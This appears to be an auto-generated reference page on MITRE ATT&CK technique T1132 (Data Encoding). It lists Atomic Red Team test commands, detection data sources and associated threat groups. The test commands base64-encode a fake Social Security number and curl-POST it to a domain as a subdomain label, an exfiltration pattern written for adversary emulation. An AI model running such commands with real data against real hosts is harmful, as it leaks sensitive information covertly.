
# Data Encoding

## Description

### MITRE Description

> Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems. (Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1132

## Potential Commands

```
echo -n 111-11-1111 | base64
curl -XPOST #{base64_data}.redcanary.com

echo -n 111-11-1111 | base64
curl -XPOST MTExLTExLTExMTE=.#{destination_url}

```

## Commands Dataset

```
[{'command': 'echo -n 111-11-1111 | base64\n'
             'curl -XPOST #{base64_data}.redcanary.com\n',
  'name': None,
  'source': 'atomics/T1132/T1132.yaml'},
 {'command': 'echo -n 111-11-1111 | base64\n'
             'curl -XPOST MTExLTExLTExMTE=.#{destination_url}\n',
  'name': None,
  'source': 'atomics/T1132/T1132.yaml'}]
```

## Potential Detections

```json
[{'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Network protocol analysis']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Data Encoding': {'atomic_tests': [{'auto_generated_guid': '1164f70f-9a88-4dff-b9ff-dc70e7bf0c25',
                                                             'description': 'Utilizing '
                                                                            'a '
                                                                            'common '
                                                                            'technique '
                                                                            'for '
                                                                            'posting '
                                                                            'base64 '
                                                                            'encoded '
                                                                            'data.\n',
                                                             'executor': {'command': 'echo '
                                                                                     '-n '
                                                                                     '111-11-1111 '
                                                                                     '| '
                                                                                     'base64\n'
                                                                                     'curl '
                                                                                     '-XPOST '
                                                                                     '#{base64_data}.#{destination_url}\n',
                                                                          'name': 'sh'},
                                                             'input_arguments': {'base64_data': {'default': 'MTExLTExLTExMTE=',
                                                                                                 'description': 'Encoded '
                                                                                                                'data '
                                                                                                                'to '
                                                                                                                'post '
                                                                                                                'using '
                                                                                                                'fake '
                                                                                                                'Social '
                                                                                                                'Security '
                                                                                                                'number '
                                                                                                                '111-11-1111.',
                                                                                                 'type': 'string'},
                                                                                 'destination_url': {'default': 'redcanary.com',
                                                                                                     'description': 'Destination '
                                                                                                                    'URL '
                                                                                                                    'to '
                                                                                                                    'post '
                                                                                                                    'encoded '
                                                                                                                    'data.',
                                                                                                     'type': 'string'}},
                                                             'name': 'Base64 '
                                                                     'Encoded '
                                                                     'data.',
                                                             'supported_platforms': ['macos',
                                                                                     'linux']}],
                                           'attack_technique': 'T1132',
                                           'display_name': 'Data Encoding'}}]
```

# Tactics


* [Command and Control](../tactics/Command-and-Control.md)


# Mitigations

None

# Actors


* [APT19](../actors/APT19.md)

* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [APT33](../actors/APT33.md)
    
